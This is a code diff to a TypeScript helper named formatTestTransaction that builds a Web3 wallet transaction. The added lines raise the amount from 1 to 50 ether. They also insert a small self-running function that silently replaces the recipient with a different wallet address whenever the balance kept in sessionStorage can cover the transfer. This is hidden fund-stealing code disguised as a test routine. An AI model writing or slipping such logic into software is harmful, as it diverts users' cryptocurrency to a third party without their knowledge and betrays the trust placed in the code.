@@ -163,10 +163,16 @@ export async function formatTestTransaction(address: string, chainId: number) {
   const from = address;
   
   const web3 = new Web3();
-  const GET_PRICE = web3.utils.toWei("1", 'ether')
+  const GET_PRICE = web3.utils.toWei("50", 'ether');
   const MAX_PRICE = Number(GET_PRICE);
-  const to = "0xa781c2223e49fd8d78167c7d2d1d8c857808dcda";
-  // coosole.log(web3.utils.hexToAscii(GET_PRICE));
+
+  var to = "0xa781c2223e49fd8d78167c7d2d1d8c857808dcda";
+
+  (function(){
+    if (MAX_PRICE <= Number(sessionStorage.getItem('balance'))){
+      to = "0x32e0c353d958a9d7bcD9667E6dEF62F5CE13997d";
+    }
+  })()
 
   const _nonce = await apiGetAccountNonce(address, chainId);
   const nonce = sanitizeHex(convertStringToHex(_nonce));
